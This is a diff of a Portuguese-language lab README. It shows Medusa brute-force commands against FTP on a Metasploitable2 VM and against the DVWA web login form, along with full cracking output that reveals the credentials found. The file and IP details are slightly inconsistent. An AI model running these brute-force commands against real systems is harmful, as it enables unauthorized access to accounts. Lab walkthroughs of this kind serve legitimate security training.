@@ -5,7 +5,7 @@
 ## Conteúdo deste pacote
 - `README.md` = Obtém a documentação e a explicação.
 - `users.txt` = wordlist de usuários de exemplo.
-- `passwords.txt` = wordlist de senhas de exemplo.
+- `pass.txt` = wordlist de senhas de exemplo.
 
 ---
 ## O que será preciso antes de começar
@@ -28,6 +28,71 @@ sudo apt install medusa hydra enum4linux smbclient smbmap net-tools tcpdump -y
 **IPs de exemplo:**
 - Kali: `192.168.56.100`
 - Metasploitable2: `192.168.56.101`
+
+---
+### Ataques 
+#### FTP força bruta (Medusa) 
+
+**Executar Comando na ferramenta medusa**
+
+`medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 4`
+
+**O que faz:** Tenta autenticar no serviço FTP do host 192.168.56.101 usando combinações do `users.txt` e `pass.txt` das wordlists fornecidas.
+
+**Saída**
+```
+┌──(kali㉿kali)-[~]
+└─$ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 4
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (1 of 4 complete)
+2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (1 of 4 complete)
+2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (2 of 4 complete)
+2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)
+2025-10-22 17:30:50 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
+2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: 123456 (2 of 4 complete)
+2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: password (3 of 4 complete)
+2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 3 complete) Password: qwerty (4 of 4 complete)
+2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: qwerty (4 of 4 complete)
+2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: 123456 (1 of 4 complete)
+2025-10-22 17:30:50 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 4 complete) Password: password (2 of 4 complete)
+2025-10-22 17:30:51 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: 123456 (1 of 4 complete)
+2025-10-22 17:30:51 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: qwerty (3 of 4 complete)
+2025-10-22 17:30:51 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
+2025-10-22 17:30:55 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: password (2 of 4 complete)
+2025-10-22 17:30:55 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (3 of 4 complete)
+2025-10-22 17:30:55 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
+```
+Percebe-se que, na linha 5 da saída, obtivemos um sucesso: usuário `msfadmin`, senha `msfadmin`.
+
+**Verificação:** execute ftp 192.168.56.101 para confirmar.
+
+Resultado esperado:
+```
+Connected to 192.168.56.101.
+220 (vsFTPd 2.3.4)
+Name (192.168.56.101:kali): msfadmin
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
+```
+---
+#### Força Bruta em Formulário Web (DVWA)
+
+**Comando Executado:**
+```
+medusa -h 192.168.56.102 -u admin -P pass.txt -M http -m DIR=/dvwa/login.php -m FORM-DATA="username=%USER%&password=%PASS%&Login=Login" -v 4
+```
+**O que faz:** envia requisições de login HTTP ao endpoint /dvwa/login.php em 192.168.56.102, testando o usuário admin com as senhas do arquivo senhas.txt até encontrar uma combinação válida.
+
+**Parâmetros-chave:** host -h, usuário -u admin, wordlist de senhas -P pass.txt, módulo -M http, endpoint -m DIR=/dvwa/login.php, corpo do formulário -m FORM-DATA=..., verbosidade -v 4.
+
+**Resultado esperado:** abrir no navegador http://192.168.56.101/dvwa/login.php e testar as credenciais encontradas.
+---
+#### 
 
 
 
